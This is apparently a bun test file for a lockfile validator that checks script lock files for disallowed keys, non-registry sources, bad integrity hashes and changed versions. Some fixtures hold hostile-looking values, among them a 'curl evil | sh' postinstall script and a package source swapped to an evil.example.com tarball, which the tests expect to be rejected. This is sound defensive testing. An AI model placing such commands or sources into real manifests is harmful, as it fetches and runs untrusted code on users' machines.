import { describe, expect, test } from "bun:test";
import { execFileSync } from "node:child_process";
import { readFileSync } from "node:fs";
import {
  compareLocks,
  parseJsonc,
  parseLock,
} from "../../f/factory/lib/metadata_patch_lock.ts";

const INTEGRITY = `sha512-${"A".repeat(86)}==`;
const OTHER_INTEGRITY = `sha512-${"B".repeat(86)}==`;

type PackageSpec = {
  readonly key?: string;
  readonly ident?: string;
  readonly registry?: string;
  readonly meta?: unknown;
  readonly integrity?: string;
};

/** bun.lockの形のロックを組み立てる。`front`と`back`で、それぞれの構造を差し替えられる。 */
function buildLock(
  options: {
    readonly front?: unknown;
    readonly back?: unknown;
    readonly packages?: Record<string, PackageSpec | unknown[]>;
    readonly deps?: Record<string, string>;
  } = {},
): string {
  const deps = options.deps ?? { "left-pad": "1.3.0" };
  const front = options.front ?? { dependencies: deps };
  const packages = options.packages ?? {
    "left-pad": { ident: "left-pad@1.3.0" },
  };
  const entries: Record<string, unknown> = {};
  for (const [key, spec] of Object.entries(packages)) {
    if (Array.isArray(spec)) {
      entries[key] = spec;
      continue;
    }
    entries[key] = [
      spec.ident ?? `${key}@1.0.0`,
      spec.registry ?? "",
      spec.meta ?? {},
      spec.integrity ?? INTEGRITY,
    ];
  }
  const back = options.back ?? {
    lockfileVersion: 2,
    configVersion: 1,
    workspaces: { "": { dependencies: deps } },
    packages: entries,
  };
  return `${JSON.stringify(front, null, 2)}\n//bun.lock\n${JSON.stringify(back, null, 2)}`;
}

function failure(text: string): string {
  const result = parseLock(text);
  return result.ok ? "ok" : result.reason;
}

describe("parseJsonc", () => {
  test("reads a trailing comma in an object", () => {
    expect(parseJsonc('{"a": 1,}')).toEqual({ ok: true, value: { a: 1 } });
  });

  test("reads a trailing comma in an array", () => {
    expect(parseJsonc('["a", ]')).toEqual({ ok: true, value: ["a"] });
  });

  test("reads string escapes", () => {
    expect(parseJsonc('"a\\n\\u0041"')).toEqual({ ok: true, value: "a\nA" });
  });

  test("rejects a duplicate key", () => {
    expect(parseJsonc('{"a": 1, "a": 2}').ok).toBe(false);
  });

  test("rejects a comment", () => {
    expect(parseJsonc('{"a": 1 /* x */}').ok).toBe(false);
  });

  test("rejects a double comma", () => {
    expect(parseJsonc("[1,,2]").ok).toBe(false);
  });

  test("rejects text after the value", () => {
    expect(parseJsonc('{"a": 1} x').ok).toBe(false);
  });

  test("rejects an unterminated string", () => {
    expect(parseJsonc('{"a": "b').ok).toBe(false);
  });

  test("rejects a __proto__ key", () => {
    expect(parseJsonc('{"__proto__": {}}').ok).toBe(false);
  });

  test("rejects a nesting that is too deep", () => {
    expect(parseJsonc("[".repeat(200)).ok).toBe(false);
  });

  test("rejects a raw control character in a string", () => {
    expect(parseJsonc('"a\nb"').ok).toBe(false);
  });
});

describe("parseLock", () => {
  test("reads the lock of a script with a dependency", () => {
    const result = parseLock(buildLock());
    expect(result.ok && result.lock.dependencies).toEqual({
      "left-pad": "1.3.0",
    });
  });

  test("reads the packages with their versions", () => {
    const result = parseLock(buildLock());
    expect(result.ok && result.lock.packages.get("left-pad")?.version).toBe(
      "1.3.0",
    );
  });

  test("reads a lock without dependencies", () => {
    const result = parseLock('{\n  "dependencies": {}\n}\n//bun.lock\n<empty>');
    expect(result.ok && result.lock.packages.size).toBe(0);
  });

  test("reads a scoped and a nested package", () => {
    const result = parseLock(
      buildLock({
        deps: { "@a/b": "^1.0.0" },
        packages: {
          "@a/b": { ident: "@a/b@1.2.3" },
          "@a/b/c": { ident: "c@2.0.0" },
        },
      }),
    );
    expect(result.ok && result.lock.packages.get("@a/b/c")?.name).toBe("c");
  });

  test("reads a lock with a trailing comma like bun writes it", () => {
    const text = buildLock().replace(/\n {2}\}\n\}$/, "\n  },\n}");
    expect(parseLock(text).ok).toBe(true);
  });

  test("reads the lock of a real script", () => {
    const text = readFileSync("f/factory/approval_decide.script.lock", "utf8");
    const result = parseLock(text);
    expect(
      result.ok && result.lock.packages.get("windmill-client")?.version,
    ).toBe("1.817.0");
  });

  test("reads every committed lock", () => {
    const names = execFileSync("git", ["ls-files", "f/*.script.lock"], {
      encoding: "utf8",
    })
      .split("\n")
      .filter((name) => name !== "");
    const rejected = names.filter(
      (name) => !parseLock(readFileSync(name, "utf8")).ok,
    );
    expect(rejected).toEqual([]);
  });

  test("rejects a lock without the marker", () => {
    expect(failure('{"dependencies": {}}')).toBe("no_marker");
  });

  test("rejects a postinstall script in the first half", () => {
    const text = buildLock({
      front: {
        scripts: { postinstall: "curl evil | sh" },
        dependencies: { "left-pad": "1.3.0" },
      },
    });
    expect(failure(text)).toBe("disallowed_key");
  });

  test("rejects trustedDependencies in the first half", () => {
    const text = buildLock({
      front: {
        dependencies: { "left-pad": "1.3.0" },
        trustedDependencies: ["left-pad"],
      },
    });
    expect(failure(text)).toBe("disallowed_key");
  });

  test("rejects overrides in the first half", () => {
    const text = buildLock({
      front: {
        dependencies: { "left-pad": "1.3.0" },
        overrides: { "left-pad": "9.9.9" },
      },
    });
    expect(failure(text)).toBe("disallowed_key");
  });

  test("rejects trustedDependencies in the second half", () => {
    const text = buildLock({
      back: {
        lockfileVersion: 2,
        workspaces: {},
        packages: {},
        trustedDependencies: ["left-pad"],
      },
    });
    expect(failure(text)).toBe("disallowed_key");
  });

  test("rejects overrides in the second half", () => {
    const text = buildLock({
      back: {
        lockfileVersion: 2,
        workspaces: {},
        packages: {},
        overrides: { a: "1.0.0" },
      },
    });
    expect(failure(text)).toBe("disallowed_key");
  });

  test.each([
    ["a dist tag", "latest"],
    ["a file path", "file:../evil"],
    ["a link", "link:../evil"],
    ["a git url", "git+https://example.com/x.git"],
    ["a github shorthand", "github:owner/repo"],
    ["a tarball url", "https://example.com/x.tgz"],
    ["an npm alias", "npm:other@1.0.0"],
    ["a workspace reference", "workspace:*"],
    ["a wildcard", "*"],
    ["an empty value", ""],
  ])("rejects %s as a dependency value", (_label, spec) => {
    const text = buildLock({ deps: { "left-pad": spec } });
    expect(failure(text)).toBe("bad_dependency");
  });

  test.each([
    ["an exact version", "1.3.0"],
    ["a caret range", "^1.3.0"],
    ["a tilde range", "~1.3.0"],
    ["a prerelease", "1.3.0-beta.1"],
  ])("accepts %s as a dependency value", (_label, spec) => {
    expect(parseLock(buildLock({ deps: { "left-pad": spec } })).ok).toBe(true);
  });

  test("rejects a replaced source of a package", () => {
    const text = buildLock({
      packages: {
        "left-pad": {
          ident: "left-pad@1.3.0",
          registry: "https://evil.example.com/left-pad.tgz",
        },
      },
    });
    expect(failure(text)).toBe("bad_source");
  });

  test("rejects an integrity that is not sha512", () => {
    const text = buildLock({
      packages: {
        "left-pad": { ident: "left-pad@1.3.0", integrity: "sha1-AAAA" },
      },
    });
    expect(failure(text)).toBe("bad_integrity");
  });

  test("rejects a package without an integrity", () => {
    const text = buildLock({
      packages: { "left-pad": ["left-pad@1.3.0", "", {}] },
    });
    expect(failure(text)).toBe("bad_package");
  });

  test("rejects an alias in the package identity", () => {
    const text = buildLock({
      packages: { "left-pad": { ident: "evil@npm:evil@1.0.0" } },
    });
    expect(failure(text)).toBe("bad_package");
  });

  test("rejects a package whose identity names another package", () => {
    const text = buildLock({
      packages: { "left-pad": { ident: "evil@1.3.0" } },
    });
    expect(failure(text)).toBe("bad_package");
  });

  test("rejects a version with a url", () => {
    const text = buildLock({
      packages: { "left-pad": { ident: "left-pad@https://x/y.tgz" } },
    });
    expect(failure(text)).toBe("bad_package");
  });

  test("rejects a workspace with another key", () => {
    const text = buildLock({
      back: {
        lockfileVersion: 2,
        workspaces: { "": { scripts: { postinstall: "x" } } },
        packages: {},
      },
    });
    expect(failure(text)).toBe("disallowed_key");
  });

  test("rejects workspace dependencies that differ from the first half", () => {
    const text = buildLock({
      back: {
        lockfileVersion: 2,
        workspaces: { "": { dependencies: { other: "1.0.0" } } },
        packages: {},
      },
    });
    expect(failure(text)).toBe("bad_workspace");
  });

  test("rejects a first half that is not an object", () => {
    expect(failure("[]\n//bun.lock\n<empty>")).toBe("malformed");
  });

  test("rejects a second half that is not JSON", () => {
    expect(failure('{"dependencies": {}}\n//bun.lock\nnot json')).toBe(
      "malformed",
    );
  });

  test("rejects two markers", () => {
    expect(
      failure('{"dependencies": {}}\n//bun.lock\n//bun.lock\n<empty>'),
    ).toBe("no_marker");
  });
});

describe("compareLocks", () => {
  const parsed = (text: string) => {
    const result = parseLock(text);
    if (!result.ok) {
      throw new Error("fixture lock must parse");
    }
    return result.lock;
  };

  test("reports no change for the same lock", () => {
    const lock = parsed(buildLock());
    expect(compareLocks(lock, lock)).toEqual({ ok: true, changes: [] });
  });

  test("reports a raised version", () => {
    const base = parsed(buildLock());
    const next = parsed(
      buildLock({
        deps: { "left-pad": "1.4.0" },
        packages: { "left-pad": { ident: "left-pad@1.4.0" } },
      }),
    );
    expect(compareLocks(base, next)).toEqual({
      ok: true,
      changes: [
        {
          name: "left-pad",
          from: "1.3.0",
          to: "1.4.0",
          integrity: INTEGRITY,
        },
      ],
    });
  });

  test("reports a new package against a missing base", () => {
    const next = parsed(buildLock());
    expect(compareLocks(null, next)).toEqual({
      ok: true,
      changes: [
        { name: "left-pad", from: null, to: "1.3.0", integrity: INTEGRITY },
      ],
    });
  });

  test("rejects the same version with another integrity", () => {
    const base = parsed(buildLock());
    const next = parsed(
      buildLock({
        packages: {
          "left-pad": { ident: "left-pad@1.3.0", integrity: OTHER_INTEGRITY },
        },
      }),
    );
    expect(compareLocks(base, next)).toEqual({
      ok: false,
      reason: "integrity_changed",
    });
  });

  test("does not report a removed package", () => {
    const base = parsed(buildLock());
    const next = parsed('{"dependencies": {}}\n//bun.lock\n<empty>');
    expect(compareLocks(base, next)).toEqual({ ok: true, changes: [] });
  });
});
